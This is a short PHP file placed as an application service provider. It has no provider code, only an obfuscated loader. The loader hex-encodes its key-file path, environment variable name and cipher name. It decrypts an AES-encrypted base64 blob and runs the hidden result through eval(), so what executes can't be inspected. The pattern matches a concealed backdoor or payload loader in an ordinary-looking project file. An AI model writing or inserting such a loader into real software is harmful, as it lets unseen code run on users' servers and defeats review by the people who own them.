<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DQs0OU2fdJc9RP1D46o2xg==');

$c=base64_decode(

'5mXaX4nMqeM3s3zZffc6BmdLfyLOcVcR7Gm77aaP3Q+zoeMLpAgWsJDHp5Aphic3Axd9D5ZeupVE' .
'NtS1Xq9jjvUgUPfZFfOP5NqXzLBKcgddm6gvdgB1z4jGkOexSTSW4bYFYsKeSi2dqUZZ4mAgUdq6' .
'gMm1xd5h2wZKLn6SCrmJc853eW+KspQ/TBh+ENXdA7LksZgFmZ58d1O3FcKL0Vq9rAuMQYjRf3a9' .
'5AhD4kAkBBYs18co0f9+nsQeAMfAEPgmSmILNLljUxLrmGi2b0Pe5JYr7DutMnXmcokvNdB4UWA5' .
'I5QuNFNxyigyrKR4+mZKvHUarvazeJZCRUtbIoLmKbKf5RB4nRq/s/cu2CINRTP1WhnDbLXFF7bt' .
'OMiF6zixMM/yXghPpEN9eML8Jlmvxc9RzB6X0ZEclc3jAVVP7RmQcqGnthHmwR7fGYFwV6+uRkjr' .
'CBIuuwDEzUwMC+0VXlOiJlpQFH4y8ogV71+qnFhbNx1oRIkPnzlRqQ614OEzwCPcabOhtUsnoFte' .
'wwZex0Z8W+8/x0tY0q2MPU7hrvu9YeMsZyAzq5pGntWsTC6U0c0iRVNHnfW6ZYqlxMkartKcVkIJ' .
'7oGk6AAhgmSTn2alxAArvwGl147SKSSOhIsyYx/ZcrQpUnO0Iy37tUlwn90PDRAU/VBsqLqztgZ9' .
'5QjHisd3n0p/qvTb5KVt27rXkXps7OYuTOw9JVzi262qT6GepPs8wWZqyJDMS899r+X9KeVNEe+t' .
'Dgb6TbFfyjrN0Uk5pUSUdDygyR1C2gL5H1B+Xi5n0TJ6ujbiUdmTpVPSOYLIIJOoSR7JiTb58uxU' .
'IxMGurZ/AXTzoApYWhPexwil67uxaCd5WGA16WNTJmMjp++eX8gQreQY2SUkNylylu3wc7Awkb7P' .
'/dX8gVCdEtyNs1M+4sy+Dk8Z2eP6M/+wnLCgGH34XGeE2o8n'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

